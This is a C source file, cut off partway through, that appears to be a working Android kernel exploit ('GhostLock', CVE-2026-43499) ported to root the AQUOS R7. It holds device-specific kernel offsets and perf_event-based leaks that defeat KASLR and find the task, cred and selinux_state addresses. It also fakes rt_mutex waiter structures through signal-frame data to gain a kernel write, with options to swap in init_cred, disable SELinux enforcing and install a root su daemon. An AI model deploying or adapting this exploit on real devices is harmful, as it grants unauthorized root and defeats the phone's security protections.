/* ghostlock510 — GhostLock (CVE-2026-43499) temporary root for AQUOS R7.
 *
 * Ported from aquos-r6-ghostlock/src/ghostlock54.c (AQUOS R6, 5.4.61-qgki,
 * ThinLTO).  All constants below are from the EXACT device build:
 *   5.10.218-android12-9-00041-g124993efd06e-ab12385094
 *   System.map / vmlinux: ci.android.com build 12385094 (S1, 2026-09-16)
 *
 * R6 -> R7 deltas found at port time (disasm-verified on vmlinux-12385094):
 *   - KASLR: slide is 2MB-aligned and the image links _text at a 2MB
 *     boundary, so align2M(min_ip) IS runtime _text.  R6's +0x80000 is GONE.
 *   - leak_selinux_state x8 window: sel_read_enforce establishes the
 *     selinux_state pointer in x8 at +0x20/+0x24 and clobbers x8 at +0x40
 *     (ldr x8,[x8,#0x20]) -> window +0x28..+0x3c (R6: +0x58..+0x60).
 *   - x8-alignment filter: R7 selinux_state link offset is +0x2a41b98, NOT
 *     4K-aligned -> the R6 mask ~0xfff rejects the true value (it is 0xb98).
 *     Use 8-alignment + BSS-range check in main() instead.
 *   - task_state: task arg stays in x25 from +0x34 (mov x25,x3);
 *     cred is x23 from +0x184 (mov x23,x0 after bl get_task_cred at +0x174).
 *     (R6 used x26 from +0x2c / x20 from +0x94.)
 *   - zero-BSS scratch: selinuxfs_mount +0x88 and
 *     selinux_null +0x90 sit right after the 0x88-byte struct, and
 *     llvm-nm -S over the full symtab shows every apparent System.map
 *     "gap" is occupied by sized objects (sel_netnode/netport_hash 0x1800,
 *     longterm_pinner 0x30008, stack_slabs 0x10000, ucounts_hashtable
 *     0x2000, ...).  BSS's ONLY zero run >= 0x400 is the 0xe78-byte
 *     region __bss_start+0x1188..+0x2000 — ghost fake-task, stamp lock and
 *     5 write windows all live there (OFF_RUN_START).
 *   - enforcing offset: DEVELOP=y, DISABLE=n -> enforcing at offset 0
 *     (R6 wrote state+1; R7 write target is state+0 itself).
 *   - __log_buf write value: rounded up to 64K as in R6 (verified:
 *     link abs 0xffffffc00a9a0000 -> byte0=0, byte2!=0).
 *
 * FLAGGED R6-CARRYOVER (only S2 on-device measurement can confirm;
 * 5.4+ThinLTO frames are not 5.10+clang12-FULL-LTO frames):
 *   - leak_syscall_sp: window +0x80..+0x380 inside futex_wait_requeue_pi,
 *     syscall_sp = sp + 0x230
 *   - sigreturn stamp: waiter at syscall_sp - 0x198, fpsimd copy SP-0x2e0,
 *     vregs stamp offset +0x148 len 0x50
 *
 * Build (NDK r30):
 *   aarch64-linux-android29-clang -O2 -Wall -Wextra -Werror -static -pthread
 *                                  ghostlock510.c -o ghostlock510
 */
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/futex.h>
#include <linux/capability.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <sys/resource.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <ucontext.h>
#include <unistd.h>

/* ---- R7 target table (System.map 12385094, link _text=0xffffffc008000000) ---- */
#define LINK_TEXT                 UINT64_C(0xffffffc008000000)
#define OFF_INIT_TASK             UINT64_C(0x279be80)
#define OFF_INIT_CRED             UINT64_C(0x27b0a60)   /* vmlinux-sizes: ffffffc00a7b0a60 D init_cred */
#define OFF_SELINUX_STATE         UINT64_C(0x2a41b98)
#define OFF_LOG_BUF               UINT64_C(0x2993d50)
#define OFF_GET_TASK_PID          UINT64_C(0x1756f0)
#define OFF_TASK_STATE            UINT64_C(0x667558)
#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x294948)
#define OFF_SEL_READ_ENFORCE      UINT64_C(0x8cf6b0)
/* BSS extent (link-relative, for the leaked-pointer sanity check) */
#define OFF_BSS_START             UINT64_C(0x2989000)   /* __bss_start   */
#define OFF_BSS_STOP              UINT64_C(0x2a80c4c)   /* __bss_stop    */
/* Ghost scratch: llvm-nm -S over vmlinux-12385094 shows BSS has exactly ONE
 * symbol-free zero run >= 0x400: __bss_start+0x1188 .. +0x2000 (0xe78
 * bytes).  (System.map-only "gaps" are illusions: sel_net{node,port}_hash
 * are 256*24=0x1800 and abut their locks; longterm_pinner is 0x30008;
 * stack_slabs 8K; ucounts_hashtable 1024*8.)  Layout mirrors R6's use of
 * zero BSS: ghost fake-task at run+0x80 (needs through ~+0x990, same last
 * PI field depth as R6), stamp lock at +0xa00, write windows +0xa80.. */
#define OFF_RUN_START             UINT64_C(0x298a188)   /* __bss_start+0x1188 */
#define SCRATCH_GHOST_OFF         UINT64_C(0x80)     /* ghost task (~0x910 used) */
#define SCRATCH_LOCK_OFF          UINT64_C(0xa00)    /* stamp fake lock          */
#define ARM64_REG_COUNT 33
#define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)

#define FUTEX_PRIVATE 128
#define LOCK_PI_PRIVATE (FUTEX_LOCK_PI | FUTEX_PRIVATE)
#define UNLOCK_PI_PRIVATE (FUTEX_UNLOCK_PI | FUTEX_PRIVATE)
#define WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE)
#define CMP_REQUEUE_PI_PRIVATE (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE)

static uint64_t runtime_text;
static uint64_t k_init_task;
static uint64_t k_selinux_state;
static uint64_t k_write_value;
static uint64_t k_scratch;
static uint64_t k_fake_lock;
static uint64_t k_fake_lock2 __attribute__((unused));
static uint64_t k_ghost_task;
static uint64_t k_current_task;
static uint64_t k_current_cred;
static uint64_t k_y_task;
static uint64_t k_waiter;
static int stage_fd = -1;
static pid_t process_pid;
static atomic_uintptr_t stamp_parent, stamp_value, stamp_lock;
static atomic_int stamp_done, stamp_status;

static int pi1, pi2, cond;
static atomic_int y_locked_l2, x_locked_l1, y_parking, x_blocking;
static atomic_int y_done, y_cleanup, x_done, y_tid;
static atomic_int y_task_ready;
static atomic_int respray_ready, respray_done;
static atomic_uintptr_t respray_parent, respray_value, respray_lock;
static unsigned fake_lock_index __attribute__((unused));
static int y_leak_only;
static int arm_only;
static int self_diag;
static int verify_stamp;
static int use_setprio;
static int use_fifo;
static int stamp3;
static int stamp4;
static int stamp5;
static int stamp6;   /* --pc-target: tree_entry pc = target itself */
static int cred_first;
static int probe_target; /* #36: write into a process-local sentinel word */
static int perm_pc; /* #40: Amazon pc trick — page-aligned ptr as pc */
static int cred_swap; /* #41: Amazon root trick — task->real_cred/cred
                       * = init_cred (pc=init_cred VA, target=slot).
                       * R7 DWARF: real_cred=task+0x778, cred=+0x780. */
static uint64_t k_init_cred;
static int cred_pc_now; /* true only during cred-swap writes: pc=init_cred */
static int install_su; /* --install-su: start root su daemon after root */
static volatile uint64_t g_probe[16];
/* --equal-ctl: control shot.  Stamp waiter_equal (prio=121 = nice 1 after
 * the trigger toggle, deadline=0) so rt_mutex_adjust_pi early-returns
 * BEFORE any chain walk: zero waiter->lock deref beyond the compare.
 * Survival => R7 sched core + dangling pi_blocked_on are safe with the
 * walk skipped; death => the equal assumption is wrong (or core itself
 * dies -- walk-gate would have to be re-examined). */
static int equal_ctl;
/* value stamped into waiter->prio by --equal-ctl: 121 tests the
 * post-change prio, 120 the pre-change prio (whichever is live at the
 * adjust_pi call site becomes equal and skips the walk). */
static int equal_prio = 121;
/* --poison: stamp-lock landing test.  waiter->lock is stamped with an
 * unmapped VA; the chain walk's first deref (raw_spin_trylock on
 * lock->wait_lock) MUST fault -> deterministic panic iff the stamp
 * actually landed where the kernel reads it.  Survival = stamp missed. */
static int poison;
#define POISON_LOCK 0x1a2b3c4d5e6f7000ULL
/* --task-y: default-geometry stamp but waiter->task = the REAL y_task
 * (running, so wake_up_process returns out immediately; task->pi_lock
 * etc. all readable) instead of the zero-BSS ghost.  Survival pins the
 * fatal deref inside the fake-task territory of the walk's tail. */
static int task_y;
/* --all-poison: FIRING TEST.  All ten stamp words land as an unmapped
 * VA except prio(+0x40)=equal_prio and deadline(+0x48)=0.  Landing +
 * equal -> rt_mutex_adjust_pi skips the walk -> single-shot trigger
 * SURVIVES (stage 'F').  Miss (or unequal) -> the walk derefs one of
 * the nine poison words -> panic at stage 't'.  Binary verdict on
 * whether the gun fires at all. */
static int all_poison;
/* --in-class: keep SCHED_OTHER (toggle nice only) in the sched_setattr
 * trigger.  Still runs __sched_setscheduler(pi=true) but drags in no
 * class-switch machinery.  Separates "BATCH class switch is lethal"
 * from "any pi=true pass is lethal" / "stamp never landed". */
static int in_class;
/* --stamp-off: vregs offset where the waiter starts (probe geometry said
 * 0xe0; R6 was 0x148).  LANDING SWEEP: stamp the equal-ctl config
 * (readable task/lock, zero tree) at each candidate offset.  The walk
 * is provably survivable with those readable words whether equal hits
 * or not (dl.deadline of a forked task is nonzero, so it usually runs),
 * so SURVIVAL pins the true landing offset; death = stale futex
 * garbage derefs. */
static uint64_t stamp_off = 0xe0;
/* stamp4 phase: 0=ANCHOR (tree_entry RB_EMPTY: dequeue skipped, enqueue
 * leaves {rb_node=waiter,leftmost=waiter} = self-consistent solo tree),
 * 1=WRITE (left=target: erase case-1b writes pc(=0) to *(target)). */
static atomic_int stamp4_phase;
static int use_setattr;

static long raw_futex(volatile int *u1, long op, long val, long val2,
                      volatile int *u2, long val3) {
  register long x0 __asm__("x0") = (long)u1;
  register long x1 __asm__("x1") = op;
  register long x2 __asm__("x2") = val;
  register long x3 __asm__("x3") = val2;
  register long x4 __asm__("x4") = (long)u2;
  register long x5 __asm__("x5") = val3;
  register long x8 __asm__("x8") = 98;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3),
                   "r"(x4), "r"(x5), "r"(x8) : "memory", "cc");
  return x0;
}

static long raw_sched_setscheduler(int tid, int policy,
                                   struct sched_param *param) {
  register long x0 __asm__("x0") = tid;
  register long x1 __asm__("x1") = policy;
  register long x2 __asm__("x2") = (long)param;
  register long x8 __asm__("x8") = 119;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x8)
                   : "memory", "cc");
  return x0;
}

static uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos) {
  uint64_t v, off = pos & (size - 1);
  if (off + 8 <= size) memcpy(&v, ring + off, 8);
  else {
    uint8_t b[8]; uint64_t first = size - off;
    memcpy(b, ring + off, first); memcpy(b + first, ring, 8 - first);
    memcpy(&v, b, 8);
  }
  return v;
}

static uint64_t leak_text(void) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 100000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
  a.sample_max_stack = 32;
  a.disabled = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 33;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 2000000; i++) syscall(__NR_gettid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head = m->data_head, tail = m->data_tail, min = UINT64_MAX;
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = rs - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h);
      uint64_t ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8;
      if (ip >= UINT64_C(0xffff000000000000) && ip < min) min = ip;
      for (uint64_t i = 0; i < nr && pos + 8 <= tail + h.size; i++) {
        uint64_t x = ring_u64(ring, rs, pos); pos += 8;
        if (x >= UINT64_C(0xffff000000000000) && x < min) min = x;
      }
    }
    tail += h.size;
  }
  munmap(m, map_size); close(fd);
  /* R7: 2MB-aligned slide + 2MB-aligned link base => align2M(min_ip) is
   * runtime _text directly (S1 verified on device; NO R6 +0x80000). */
  return min == UINT64_MAX ? 0 : (min & ~UINT64_C(0x1fffff));
}

static uint64_t leak_task_from_status(const char *status_path,
                                      uint64_t *cred_out) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 10000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int status_fd = open(status_path, O_RDONLY | O_CLOEXEC);
  if (status_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char status[4096];
  for (int i = 0; i < 100000; i++) {
    syscall(__NR_lseek, status_fd, 0, SEEK_SET);
    syscall(__NR_read, status_fd, status, sizeof(status));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      uint64_t state = runtime_text + OFF_TASK_STATE;
      /* R7 disasm: +0x34 mov x25,x3 (task); before that the arg is x3.
       * x25 keeps the task pointer for the whole function. */
      if (abi && ip >= state && ip < state + 0x174 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        unsigned task_reg = ip <= state + 0x34 ? 3 : 25;
        uint64_t task = ring_u64(ring, size, pos + task_reg * 8);
        if (task >= UINT64_C(0xffffff8000000000) &&
            task < UINT64_C(0xffffffc000000000) && !(task & 7)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != task; slot++);
          if (slot < 16) { candidates[slot] = task; counts[slot]++; }
        }
      }
      /* R7 disasm: +0x174 bl get_task_cred, +0x184 mov x23,x0 (cred).
       * x23 is the cred pointer until the epilogue ldp at +0x74c. */
      if (abi && ip >= state + 0x184 && ip < state + 0x6f8 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t cred = ring_u64(ring, size, pos + 23 * 8); /* x23 */
        if (cred >= UINT64_C(0xffffff8000000000) &&
            cred < UINT64_C(0xffffffc000000000) && !(cred & 7))
          *cred_out = cred;
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(status_fd); close(fd);
  return best_count && *cred_out ? best : 0;
}

/* FLAGGED R6-CARRYOVER: window and sp delta are R6 frame geometry.
 * S2 must re-measure on R7 (5.10 + clang12 FULL-LTO). */
static uint64_t leak_syscall_sp(void) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  volatile int a1 = 1, a2 = 0;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 150000; i++)
    (void)raw_futex(&a1, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &a2, 0);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_FUTEX_WAIT_REQUEUE_PI;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x80 && ip < fun + 0x380 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t sp = ring_u64(ring, size, pos + 31 * 8);
        /* R7 disasm (vmlinux-12385094): futex_wait_requeue_pi frame is
         * sub sp,sp,#0x1a0 (callee saves at sp+0x140..0x198), and
         * rt_mutex_wait_proxy_lock is called with x1 = sp + 0x90.  The
         * sampled sp is the in-function SP, so:
         *   syscall SP (pt_regs) = sp + 0x1a0
         *   waiter               = sp + 0x90 = syscall_sp - 0x110
         * (R6: frame 0x170, waiter SP-0x198.) */
        uint64_t syscall_sp = sp + 0x1a0;
        unsigned slot;
        for (slot = 0; slot < 16 && candidates[slot] &&
             candidates[slot] != syscall_sp; slot++);
        if (slot < 16) { candidates[slot] = syscall_sp; counts[slot]++; }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(fd);
  return best_count ? best : 0;
}

static uint64_t leak_selinux_state(void) {
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (enforce_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(enforce_fd); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char b[8];
  for (int i = 0; i < 150000; i++) {
    (void)syscall(__NR_lseek, enforce_fd, 0, SEEK_SET);
    (void)syscall(__NR_read, enforce_fd, b, sizeof(b));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_SEL_READ_ENFORCE;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t tmp[sizeof(h)]; size_t first = size - off;
      memcpy(tmp, ring + off, first);
      memcpy(tmp + first, ring, sizeof(h) - first);
      memcpy(&h, tmp, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      /* R7 ON-DEVICE FACT (r7probe dump 2026-09-17, 6 samples): at
       * ip=fun+0x60 (the ldarb before scnprintf) x8 holds EXACTLY the
       * selinux_state VA.  Note runtime text (0xffffffe9...) sorts BELOW
       * ffffffc000000000 on this device (KASLR lands low in the module/
       * vmalloc area), so the R6-style ">= 0xffffffc000000000" filter
       * rejects the true value — filter by BSS range + 8-alignment
       * instead (done in main() via the same range check). */
      if (abi && ip >= fun + 0x60 && ip <= fun + 0x60 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t state = ring_u64(ring, size, pos + 8 * 8);
        if (state >= UINT64_C(0xffff000000000000) && !(state & 7)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != state; slot++);
          if (slot < 16) { candidates[slot] = state; counts[slot]++; }
        }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(enforce_fd); close(fd);
  return best_count ? best : 0;
}

static void cpu_yield(void) {
  __asm__ volatile("yield" ::: "memory");
}

static void record_stage(char stage) {
  if (stage_fd < 0) return;
  ssize_t written = pwrite(stage_fd, &stage, 1, 0);
  if (written != 1) return;
  (void)fsync(stage_fd);
}

struct k_fpsimd_context {
  uint32_t magic, size, fpsr, fpcr;
  uint8_t vregs[32 * 16];
};

static struct k_fpsimd_context *find_fpsimd(unsigned char *p,
                                            unsigned char *end) {
  while ((size_t)(end - p) >= 8) {
    uint32_t magic, size;
    memcpy(&magic, p, 4); memcpy(&size, p + 4, 4);
    if (!magic && !size) return NULL;
    if (size < 8 || (size & 15) || (size_t)(end - p) < size) return NULL;
    if (magic == UINT32_C(0x46508001) && size >= 0x210)
      return (struct k_fpsimd_context *)(void *)p;
    p += size;
  }
  return NULL;
}

static void sigusr2(int sig, siginfo_t *info, void *opaque) {
  (void)sig; (void)info;
  ucontext_t *uc = opaque;
  unsigned char *start = uc->uc_mcontext.__reserved;
  struct k_fpsimd_context *fp = find_fpsimd(start, start +
                                             sizeof(uc->uc_mcontext.__reserved));
  if (!fp) {
    atomic_store(&stamp_status, -1); atomic_store(&stamp_done, 1); return;
  }
  /* R7 ON-DEVICE (r7probe2 geo, 2 runs, identical): the sigreturn
   * restore_fpsimd_context buffer sits at SP_fpsimd = SP_futex - 0x60 with
   * vregs at SP_fpsimd+0x10, while waiter = SP_futex + 0x90 ->
   * stamp offset = 0x90 + 0x60 - 0x10 = 0xe0 (R6: 0x148).  memset 0x50
   * ends at 0x130 < 0x200 (vregs size) — inside the copied context. */
  uint64_t *w = (uint64_t *)(void *)(fp->vregs + stamp_off);
  memset(w, 0, 0x50);
  if (all_poison) {
    for (int i = 0; i < 10; i++) w[i] = POISON_LOCK;
    w[8] = equal_prio;               /* prio: equal on purpose     */
    w[9] = 0;                        /* deadline: equal on purpose */
    atomic_store(&stamp_status, 1);
    atomic_store(&stamp_done, 1);
    return;
  }
  if (poison) {
    /* LANDING TEST: prio=0 guarantees the adjust_pi entry-check
     * mismatch (live prio is 121 after the nice-1 toggle) -> the chain
     * walk MUST run -> its first deref is waiter->lock (+0x38) at the
     * raw_spin_trylock on wait_lock.  That VA is unmapped scratch:
     * panic == the kernel really read our stamped words at +0x30..+0x48.
     * SURVIVAL == the kernel never read them: the stamp never landed
     * (waiter base or offsets wrong) -- everything else was noise. */
    w[6] = k_init_task;
    w[7] = POISON_LOCK;
    w[8] = 0;                /* prio: mismatched on purpose */
    w[9] = 0;                /* deadline */
    atomic_store(&stamp_status, 1);
    atomic_store(&stamp_done, 1);
    return;
  }
  if (equal_ctl) {
    /* prio == the trigger's post-change prio (nice 1 -> 120+1) and
     * deadline=0 (CFS dl default): rt_mutex_adjust_pi's entry check
     * compares ONLY these two words -> equal -> return before any
     * chain walk. */
    w[8] = equal_prio;
    w[9] = 0;
    /* #20 lesson: it zeroed task/lock too -- if the walk RAN, it died
     * dereferencing VA 0.  This run keeps every pointer READABLE (init
     * task, zero-BSS slot): survival then means "equal skip OR gentle
     * walk" -- either way the sched core itself is innocent; panic
     * means the walk derefs something my 5.10 reading misses. */
    w[6] = k_init_task;
    w[7] = k_fake_lock;
    atomic_store(&stamp_status, 1);
    atomic_store(&stamp_done, 1);
    return;
  }
  if (stamp4) {
    /* stamp4 self-consistent solo tree (5.10.218 rbtree.c/rtmutex.c
     * @124993efd06e read in OSS tree, 2026-09-18):
     *  - ANCHOR walk: tree_entry RB_EMPTY (rb_right=self) -> dequeue
     *    early-returns; enqueue into the ZERO slot writes only
     *    slot.rb_node/slot.rb_leftmost = waiter (leftmost=true, zero
     *    iterations).  Slot owner stays 0: walk ends via
     *    wake_up_process(init_task), same Amazon-proven path.
     *  - WRITE walk (same slot, now self-consistent solo): erase path
     *    rb_erase_cached sees leftmost==node -> rb_next: rb_right=0,
     *    parent(pc=0)=NULL -> leftmost=NULL (stack reads only).
     *    __rb_erase_augmented case 1b (left child = target):
     *    *target = pc = 0 (THE write), root.rb_node = target,
     *    rebalance=NULL.  Post-erase re-enqueue re-enters through
     *    slot.rb_node = target -- the residual deref suspect.
     * pi_tree self-empty stays in both phases (dequeue_pi skipped);
     * task=init_task in both phases. */
    w[4] = k_waiter + 0x18;              /* pi.rb_right self => EMPTY */
    w[6] = k_init_task;                  /* wake target = init_task   */
    w[7] = atomic_load(&stamp_lock);     /* fresh-then-solo slot      */
    if (atomic_load(&stamp4_phase) == 0) {
      w[0] = k_waiter;                   /* pc=self => tree RB_EMPTY  */
      w[1] = 0;                          /* tree.rb_right (unused)    */
      w[2] = 0;                          /* tree.rb_left  (unused)    */
    } else {
      w[0] = 0;                          /* pc = value written (0)    */
      w[1] = 0;                          /* tree.rb_right (leaf)      */
      w[2] = atomic_load(&stamp_value);  /* tree.rb_left = WRITE TARGET */
    }
    atomic_store(&stamp_status, 1);
    atomic_store(&stamp_done, 1);
    return;
  }
  if (stamp3 || stamp5) {
    /* Amazon 5.10 PoC (R0rt1z2/GhostLock) geometry:
     * tree: pc=write-value, right=0 (leaf), left=target  -> rb_erase's
     *   rb_set_parent_color(child1=target, ...) writes (pc|color) to
     *   *target: THE write primitive.
     * stamp5 (#32): parent=target variant.  pc=(target)&~3 (BLACK,
     *   parent=target), left=right=0.  Erase case 1a: __rb_change_child
     *   writes NULL into target->rb_right (+0x10) since target->rb_left
     *   (+0x08) != waiter; pc black -> rebalance=parent=target ->
     *   ____rb_erase_color runs OFF the target's own content.  If it
     *   survives, the walk tolerates erase_color and target+0x10 gets
     *   zeroed; if it dies, the sibling deref (target+0x08 content read
     *   as rb_node) is the suspect.  Either way one variable moved.
     * pi_tree: rb_right = &pi_tree_entry (waiter+0x18) = RB_EMPTY ->
     *   dequeue_pi early-returns (zero is NOT empty in 5.10!).
     * task = init_task (real, always running: wake is a no-op; zero-BSS
     *   ghost lacks sched_class and dies on wake/deref).
     * lock = fresh zero scratch slot per write (never reuse a dirty one). */
